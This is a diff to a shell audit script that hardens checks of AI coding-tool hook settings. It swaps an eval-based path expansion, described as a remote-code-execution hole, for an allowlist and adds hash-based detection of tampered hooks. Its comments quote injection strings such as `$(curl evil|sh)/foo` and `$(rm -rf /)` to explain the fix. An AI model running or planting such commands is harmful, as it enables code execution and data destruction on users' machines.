@@ -23,6 +23,35 @@ INFO_COUNT=0
 HIGH_COUNT=0
 CRIT_COUNT=0
 
+# _safe_expand_env_path — expand a literal `$VAR/...` or `${VAR}/...`
+# token from an UNTRUSTED source (e.g. ~/.claude/settings.json hook
+# command field) using ONLY the explicit allowlist below. Prints the
+# resolved path to stdout on success (exit 0); returns 1 for any token
+# that doesn't match a known prefix (which includes command-substitution
+# attempts like `$(rm -rf /)` and `` `cmd` `` — those don't match the
+# literal `$NAME/` patterns).
+#
+# NEVER replace this with eval. Closes Codex R2 (PR #124): the previous
+# eval-based path executed arbitrary commands from settings.json when
+# audit.sh check_hooks or walter-os baseline-hooks ran.
+#
+# Keep this in sync with the identical copy in bin/walter-os.
+_safe_expand_env_path() {
+  local tok="$1"
+  # shellcheck disable=SC2016 # single-quoted '$VAR/' is INTENTIONAL —
+  # the case patterns must match the LITERAL `$NAME` text in $tok (which
+  # came from settings.json). Expansion is what we're protecting against.
+  case "$tok" in
+    '$HOME'/*)              printf '%s' "${HOME}${tok#\$HOME}" ;;
+    '${HOME}'/*)            printf '%s' "${HOME}${tok#'${HOME}'}" ;;
+    '$WALTER_OS_HOME'/*)    [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#\$WALTER_OS_HOME}" ;;
+    '${WALTER_OS_HOME}'/*)  [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#'${WALTER_OS_HOME}'}" ;;
+    '$WALTER_CONFIG'/*)     [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#\$WALTER_CONFIG}" ;;
+    '${WALTER_CONFIG}'/*)   [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#'${WALTER_CONFIG}'}" ;;
+    *)                      return 1 ;;
+  esac
+}
+
 bump() {
   local level="$1"
   # Copilot R2 #129 R2.4: medium maps to the same bucket as high
@@ -30,10 +59,16 @@ bump() {
   # finer-grained reporting in the markdown report; severity counts
   # treat medium and high identically so neither is silently dropped.
   case "$level" in
-    info)   (( INFO_COUNT++ )); (( SEVERITY < 1 )) && SEVERITY=1 ;;
-    medium) (( HIGH_COUNT++ )); (( SEVERITY < 2 )) && SEVERITY=2 ;;
-    high)   (( HIGH_COUNT++ )); (( SEVERITY < 2 )) && SEVERITY=2 ;;
-    crit)   (( CRIT_COUNT++ )); (( SEVERITY < 3 )) && SEVERITY=3 ;;
+    info)   (( INFO_COUNT++ ));   (( SEVERITY < 1 )) && SEVERITY=1 ;;
+    # medium findings count toward HIGH for exit-code purposes (so
+    # they still block the daily-audit-gate hook) but the level
+    # string "medium" is preserved in the finding output for human
+    # review. Added for Copilot R2 #124 R2.6 / #129 R2.1 — previously
+    # `finding medium ...` calls were silently dropped because bump()
+    # didn't recognize the level.
+    medium) (( HIGH_COUNT++ ));   (( SEVERITY < 2 )) && SEVERITY=2 ;;
+    high)   (( HIGH_COUNT++ ));   (( SEVERITY < 2 )) && SEVERITY=2 ;;
+    crit)   (( CRIT_COUNT++ ));   (( SEVERITY < 3 )) && SEVERITY=3 ;;
   esac
 }
 
@@ -109,6 +144,40 @@ check_secrets_in_configs() {
 
 # ---------- 3. Hooks integrity ----------
 
+# _audit_hash_file — portable SHA256 (GNU/BSD).
+# Closes Copilot R2 #124 R2.1: prints to a global _HASH_FILE_RESULT
+# variable AND returns 0/1 for success/failure. Callers must check
+# the return code — a missing hasher returns 1 (NOT an empty string
+# treated as a valid hash, which previously caused false-CRIT triggers
+# when current_sha was empty but stored_sha was non-empty).
+_audit_hash_file() {
+  local file="$1"
+  _HASH_FILE_RESULT=""
+  [[ -r "$file" && -f "$file" ]] || return 1
+  if command -v sha256sum >/dev/null 2>&1; then
+    _HASH_FILE_RESULT=$(sha256sum "$file" 2>/dev/null | awk '{print $1}')
+  elif command -v shasum >/dev/null 2>&1; then
+    _HASH_FILE_RESULT=$(shasum -a 256 "$file" 2>/dev/null | awk '{print $1}')
+  else
+    return 1
+  fi
+  [[ -n "$_HASH_FILE_RESULT" ]]
+}
+
+# _check_hooks_v1 — legacy v1 detection fallback (command-strings only).
+_check_hooks_v1() {
+  local settings="$1" checksums="$2"
+  local current; current="$(jq '[.hooks // {} | .. | objects | select(has("command")) | .command]' "$settings")"
+  local stored; stored="$(cat "$checksums")"
+  if [[ "$current" != "$stored" ]]; then
+    finding high "hooks-modified" \
+      "Hooks in $settings differ from v1 baseline" \
+      "Inspect new hooks. If safe: walter-os baseline-hooks (also migrates to v2)"
+  fi
+}
+
+# check_hooks — v2 detection: per-entry content SHA256 + command drift.
+# Closes F1 BLOCKER (external review 2026-05-21, issue #115). See ADR 0016.
 check_hooks() {
   local settings="${CLAUDE_HOME}/settings.json"
   [[ -f "$settings" ]] || return 0
@@ -118,21 +187,155 @@ check_hooks() {
   fi
   local hook_count
   hook_count="$(jq '[.hooks // {} | .. | objects | select(has("command"))] | length' "$settings" 2>/dev/null || echo 0)"
-  if [[ "$hook_count" -gt 0 ]]; then
-    local checksums="${WALTER_CONFIG}/hook-checksums.json"
-    if [[ ! -f "$checksums" ]]; then
-      # First run: silently snapshot. Future runs compare against this.
-      jq '[.hooks // {} | .. | objects | select(has("command")) | .command]' "$settings" > "$checksums"
-    else
-      local current; current="$(jq '[.hooks // {} | .. | objects | select(has("command")) | .command]' "$settings")"
-      local stored; stored="$(cat "$checksums")"
-      if [[ "$current" != "$stored" ]]; then
-        finding high "hooks-modified" \
-          "Hooks in $settings differ from baseline" \
-          "Inspect new hooks for malicious commands. If safe: walter-os baseline-hooks"
+  [[ "$hook_count" -gt 0 ]] || return 0
+
+  local checksums="${WALTER_CONFIG}/hook-checksums.json"
+
+  # First run — snapshot v2 directly. Uses the SAME inline-detection
+  # heuristic as bin/walter-os cmd_baseline_hooks (Copilot R1 #124 R1.1)
+  # and atomic write via .tmp + mv (Copilot R1 #124 R1.6).
+  if [[ ! -f "$checksums" ]]; then
+    mkdir -p "$(dirname "$checksums")"
+    local result; result=$(jq -n '{version: 2, hooks: []}')
+    local hooks_array; hooks_array=$(jq '[.hooks // {} | .. | objects | select(has("command"))]' "$settings")
+    local n; n=$(jq 'length' <<<"$hooks_array")
+    local i=0
+    while [[ $i -lt $n ]]; do
+      local cmd; cmd=$(jq -r ".[$i].command" <<<"$hooks_array")
+      local first_tok; first_tok=$(awk '{print $1}' <<<"$cmd")
+      local path=""
+      case "$first_tok" in
+        /*|./*|../*)
+          [[ -f "$first_tok" ]] && path="$first_tok"
+          ;;
+        ~/*)
+          local resolved="${first_tok/#\~/$HOME}"
+          [[ -f "$resolved" ]] && path="$resolved"
+          ;;
+        \$*)
+          # Env-var-prefixed path. Use the explicit allowlist below —
+          # NEVER eval. Closes Codex R2 (PR #124): eval on a token sourced
+          # from settings.json was an RCE vector — an attacker who could
+          # tamper with ~/.claude/settings.json could put `$(curl evil|sh)/foo`
+          # in a hook command field; the eval would then execute it the
+          # next time `audit.sh check_hooks` ran.
+          # Keep the allowlist + the bin/walter-os cmd_baseline_hooks
+          # version in sync — they MUST match.
+          local resolved=""
+          if resolved="$(_safe_expand_env_path "$first_tok")"; then
+            [[ -n "$resolved" && -f "$resolved" ]] && path="$resolved"
+          fi
+          ;;
+      esac
+      local sha=""
+      if [[ -n "$path" ]] && _audit_hash_file "$path"; then
+        sha="$_HASH_FILE_RESULT"
       fi
-    fi
+      result=$(jq --arg c "$cmd" --arg p "$path" --arg s "$sha" \
+        '.hooks += [{command: $c, path: $p, sha256: $s}]' <<<"$result")
+      i=$((i + 1))
+    done
+    echo "$result" | jq --sort-keys '.' > "${checksums}.tmp" && mv "${checksums}.tmp" "$checksums"
+    return 0
   fi
+
+  # Schema detection. The v1 and error paths return early; the v2 path
+  # falls through to the per-entry hash check below. We deliberately
+  # don't store the schema label — the control flow already encodes it
+  # and shellcheck SC2034 would flag a write-only variable.
+  if jq -e 'type == "object" and .version == 2' "$checksums" >/dev/null 2>&1; then
+    : # v2 — fall through to the per-entry content check
+  elif jq -e 'type == "array"' "$checksums" >/dev/null 2>&1; then
+    finding info "hook-checksums-v1-schema" \
+      "hook-checksums.json on legacy v1 schema (does NOT detect in-place script modification)" \
+      "Run: walter-os baseline-hooks to migrate to v2 (content-hashing)"
+    _check_hooks_v1 "$settings" "$checksums"
+    return 0
+  else
+    finding high "hook-checksums-corrupted" \
+      "hook-checksums.json schema not recognized" \
+      "Inspect manually then: walter-os baseline-hooks"
+    return 0
+  fi
+
+  # v2: per-entry content check
+  local entries; entries=$(jq -c '.hooks[]' "$checksums")
+  while IFS= read -r entry; do
+    [[ -n "$entry" ]] || continue
+    local cmd path stored_sha
+    cmd=$(jq -r '.command' <<<"$entry")
+    path=$(jq -r '.path' <<<"$entry")
+    stored_sha=$(jq -r '.sha256' <<<"$entry")
+
+    # Skip if baseline recorded this as inline (no path) — inline
+    # commands are documented as not-content-hashable; we record them
+    # so the operator can see them in the report, but skip the integrity
+    # check (Copilot R1 #124 R1.6).
+    [[ -z "$path" ]] && continue
+
+    # Copilot R6 #124: empty stored_sha with a resolvable path = the
+    # baseline tried to hash this file + failed (no hasher available,
+    # or unreadable at baseline-time). Previously we silently skipped
+    # — that means a hook with `path=/x/y, sha=""` would NEVER be
+    # integrity-checked even after sha256sum was installed. Now emit
+    # INFO so the operator knows the entry is in skipped-state + can
+    # re-baseline to fix it.
+    if [[ -z "$stored_sha" ]]; then
+      finding info "hook-sha-not-recorded" \
+        "Hook '$path' (cmd: $cmd) has empty stored sha in baseline; content-integrity check skipped" \
+        "Re-run: walter-os baseline-hooks (re-hashes all entries; needs sha256sum/shasum installed)"
+      continue
+    fi
+
+    if [[ ! -f "$path" || ! -r "$path" ]]; then
+      finding high "hook-file-missing" \
+        "Hook script vanished or unreadable: $path (cmd: $cmd)" \
+        "Restore from git OR walter-os baseline-hooks if intentional"
+      continue
+    fi
+
+    # Closes Copilot R2 #124 R2.1: if no hasher is installed,
+    # _audit_hash_file returns 1 + empty result. Treat that as
+    # "cannot verify" (HIGH), NOT as "content mismatch" (CRIT).
+    local current_sha=""
+    if _audit_hash_file "$path"; then
+      current_sha="$_HASH_FILE_RESULT"
+    else
+      finding high "hook-hasher-missing" \
+        "No SHA256 tool installed; cannot verify hook content for $path" \
+        "brew install coreutils  (or use macOS default shasum)"
+      continue
+    fi
+    if [[ "$current_sha" != "$stored_sha" ]]; then
+      finding crit "hook-content-modified" \
+        "Hook script CONTENT changed in place (path unchanged): $path. Stored sha: ${stored_sha:0:12}..., current sha: ${current_sha:0:12}..." \
+        "REVIEW DIFF: git diff $path. If intentional: walter-os baseline-hooks"
+    fi
+  done <<< "$entries"
+
+  # Command-set drift — split into added/removed for proper severity
+  # (Copilot R1 #124 R1.5: spec says removed=medium, added/changed=high).
+  local stored_cmds current_cmds
+  stored_cmds=$(jq -r '.hooks[].command' "$checksums" 2>/dev/null | sort -u)
+  current_cmds=$(jq -r '.hooks // {} | .. | objects | select(has("command")) | .command' "$settings" 2>/dev/null | sort -u)
+
+  local added removed
+  added=$(comm -23 <(echo "$current_cmds") <(echo "$stored_cmds"))
+  removed=$(comm -13 <(echo "$current_cmds") <(echo "$stored_cmds"))
+
+  while IFS= read -r cmd; do
+    [[ -z "$cmd" ]] && continue
+    finding high "hook-added" \
+      "Hook command added in $settings since baseline: $cmd" \
+      "Inspect the new hook. If safe: walter-os baseline-hooks"
+  done <<< "$added"
+
+  while IFS= read -r cmd; do
+    [[ -z "$cmd" ]] && continue
+    finding medium "hook-removed" \
+      "Hook command removed from $settings since baseline: $cmd" \
+      "If intentional: walter-os baseline-hooks"
+  done <<< "$removed"
 }
 
 # ---------- 4. MCP scanners ----------
